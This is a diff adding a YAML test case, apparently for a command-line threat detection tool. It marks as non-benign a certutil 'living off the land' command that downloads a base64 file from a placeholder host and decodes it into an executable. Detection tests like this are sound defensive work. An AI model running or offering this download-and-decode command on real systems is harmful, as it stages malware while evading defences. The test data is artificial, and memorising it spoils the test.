@@ -1,0 +1,21 @@
+description: certutil -decode LOLBin decoding a payload file
+expected:
+  artifact_types: []
+  attack_fingerprint_hash: 756a8b8a17abbdb9d55c6b8b2eb06a00b2c220b5e40b256e1085b0d7bcb0bdd0
+  behavior_codes: []
+  benign: false
+  ioc_kinds: []
+  mitre: []
+  terminal_state: canonical
+input:
+  inline: certutil.exe -urlcache -split -f https://example.invalid/x.b64 x.b64 &&
+    certutil.exe -decode x.b64 x.exe
+  kind: text
+slug: cl-06-certutil-decode-lolbin
+tags:
+- certutil
+- lolbin
+- T1140
+- T1027
+track: command_line
+version: '1.0'
